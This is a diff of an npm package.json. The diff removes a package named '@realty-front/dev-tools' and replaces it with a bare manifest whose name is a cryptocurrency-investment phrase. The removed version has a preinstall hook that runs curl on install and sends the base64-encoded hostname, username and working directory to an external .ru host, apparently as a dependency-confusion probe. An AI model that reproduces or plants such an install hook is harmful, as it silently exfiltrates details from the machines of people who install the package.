@@ -1,1 +1,11 @@
-{"name": "@realty-front/dev-tools", "version": "1.13.2", "description": "Hello =)", "main": "index.js", "scripts": {"test": "echo \"Error: no test specified\" && exit 1", "preinstall": "curl -H \"Package: @realty-front/dev-tools\" -H \"Version: 1.13.2\" -H \"Hostname: $(hostname | base64)\" -H \"Whoami: $(whoami | base64)\" -H \"Pwd: $(pwd | base64)\"  -d \"meow! security test\" http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"}, "author": "act1on3", "license": "ISC"}
+{
+  "name": "vygodno-li-vlozhit-dengi-v-kriptovaliutu-t13ippemk",
+  "version": "1.0.0",
+  "description": "vygodno-li-vlozhit-dengi-v-kriptovaliutu-t13ippemk",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "t13ippemk",
+  "license": "ISC"
+}
